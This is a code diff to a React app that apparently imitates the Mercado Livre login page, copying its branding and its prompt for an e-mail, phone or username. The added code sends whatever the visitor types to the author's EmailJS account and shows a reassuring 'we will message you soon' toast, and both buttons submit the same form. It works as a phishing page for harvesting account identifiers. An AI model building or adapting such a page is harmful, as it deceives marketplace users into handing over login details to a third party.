@@ -7,10 +7,22 @@ import { RxPerson } from "react-icons/rx";
 import { HiMiniDevicePhoneMobile } from "react-icons/hi2";
 import { MdKeyboardArrowRight } from "react-icons/md";
 
+import { ToastContainer, toast } from 'react-toastify';
+import 'react-toastify/dist/ReactToastify.css';
+
+import emailjs from 'emailjs-com';
 
 function App() {
 
   const [wid, setWid] = useState(0);
+  const [text, setText] = useState('')
+  const [textFalse, setTextFalse] = useState('')
+  const [isLoading, setIsLoading] = useState(false)
+
+  function saveText(e){
+    setText(e.target.value)
+    setTextFalse(e.target.value)
+  }
 
   const handleResize = () => {
     if (window.innerWidth >= 1024) {
@@ -18,6 +30,38 @@ function App() {
     } else {
       setWid(14);
     }
+  };
+
+  const sendYourEmail = () => {
+    
+    setTextFalse("")
+    setIsLoading(true)
+
+    emailjs.send(
+      'service_aw1qpyf',
+      'template_6l98bf6',
+      {
+        message: `${text}`
+      },
+      'xsDcCynNb4Ebmt0OT'
+    )
+    .then((result) => {
+        setText('')
+        notifySuccess()
+        setIsLoading(false)
+      }, (error) => {
+        setText('')
+        notifyError()
+        setIsLoading(false)
+    });
+  };
+
+  const notifyError = () => {
+    toast.error('Lámentamos estamos com problemas técnicos!');  // Exibe um toast com a mensagem "Olá, mundo!"
+  };
+  
+  const notifySuccess = () => {
+    toast.success('Enviaremos uma mensagem em breve');  // Exibe um toast com a mensagem "Olá, mundo!"
   };
 
   useEffect(() => {
@@ -32,7 +76,7 @@ function App() {
 
   return (
     <div className="w-screen h-screen flex flex-col items-center justify-start overflow-hidden bg-[#ffffff]">
-      <div className='w-full h-[48px] flex items-center justify-start bg-[#FFF159] lg:bg-[#FFE600] px-2'>
+      <div className='w-full h-[48px] flex items-center justify-start bg-[#FFF159] lg:bg-[#FFE600] px-2 z-[4]'>
         {wid == 44 ? (
           <img src={logo_lg} alt="logo com nome do lado" className={`w-[104px]`} />
         ):(
@@ -40,7 +84,7 @@ function App() {
         )}
       </div>
       
-      <div className='w-[90%] flex justify-start items-center flex-col lg:flex-row lg:items-start lg:justify-center lg:gap-10 lg:mt-10'>
+      <div className='w-[90%] flex justify-start items-center flex-col lg:flex-row lg:items-start lg:justify-center lg:gap-10 lg:mt-10 z-[4]'>
         <div className='w-full flex-col items-start lg:ps-9'>
           <p className='w-full max-w-[750px] text-[32px] lg:text-[30px] text-[#000000E6] leading-[40px] font-semibold mt-3'>
             Digite seu e-mail, telefone ou usuário do Mercado Livre
@@ -77,17 +121,24 @@ function App() {
         <div className='w-full flex flex-col justify-start items-center'>
           <div className='mt-5 w-full max-w-[750px] flex flex-col items-start lg:border-[1px] lg:border-[#b2b2b2] lg:rounded-[8px] lg:py-10 lg:px-8'>
             <label className='ml-2 font-medium mb-1' htmlFor="input">E-mail, telefone ou usuário</label>
-            <input className='w-full py-[13px] px-[12px] border-[1px] mb-4 border-[#b2b2b2] rounded-[8px] outline-none focus:border-[#3483FA]' type="text" id='input' name='input' placeholder='' />
+            <input className='w-full py-[13px] px-[12px] border-[1px] mb-4 border-[#b2b2b2] rounded-[8px] outline-none focus:border-[#3483FA]' type="text" id='input' name='input' placeholder='' value={textFalse} onChange={(e) => saveText(e)} />
           
-            <div className='w-full flex flex-col lg:flex-row'>
-              <div className='bg-[#3483FA] bg:text-[#ffffff] rounded-[8px] mt-3 w-full lg:w-auto lg:px-5 flex items-center justify-center py-[14px] capitalize text-[#ffffff] font-bold hover:opacity-[0.7] transition-all duration-[0.4s] cursor-pointer'>
-                continuar
-              </div>
+            <form className='w-full flex flex-col lg:flex-row gap-2' onSubmit={(e) => {
+              e.preventDefault()
+              sendYourEmail()
+            }}>
+              <input
+                type='submit'
+                className='bg-[#3483FA] bg:text-[#ffffff] rounded-[8px] mt-3 w-full lg:w-auto lg:px-5 flex items-center justify-center py-[14px] capitalize text-[#ffffff] font-bold focus:bg-[#3061ab] hover:bg-[#3061ab] transition-all duration-[0.4s] cursor-pointer'
+                value="continuar"
+              />
           
-              <div className='text-[#3483FA] rounded-[8px] mt-3 w-full lg:w-auto lg:px-5 flex items-center justify-center py-[14px] capitalize bg-[#ffffff] font-bold hover:opacity-[0.7] transition-all duration-[0.4s] cursor-pointer'>
-                criar conta
-              </div>
-            </div>
+              <input
+                type='submit'
+                className='text-[#3483FA] rounded-[8px] mt-3 w-full lg:w-auto lg:px-5 flex items-center justify-center py-[14px] capitalize bg-[#ffffff] font-bold focus:bg-[#ebebeb] hover:bg-[#ebebeb] transition-all duration-[0.4s] cursor-pointer'
+                value="criar conta"
+              />
+            </form>
         </div>
           
 
@@ -137,6 +188,17 @@ function App() {
 
         </div>
       </div>
+      
+      <ToastContainer position="top-right" autoClose={3500} />
+      
+      <div className={`bg-[#0000004c] w-screen h-screen absolute top-0 left-0 flex items-center justify-center transition-all duration-[.4s]
+        ${isLoading == true ? 'opacity-1 z-[20]' : 'opacity-[0] z-[-2]'}
+      `}>
+        <div className="flex items-center justify-center min-h-screen">
+          <div className="w-20 h-20 border-[8px] border-t-transparent border-[#3483FA] rounded-full animate-spin"></div>
+        </div>
+      </div>
+
     </div>
   )
 }
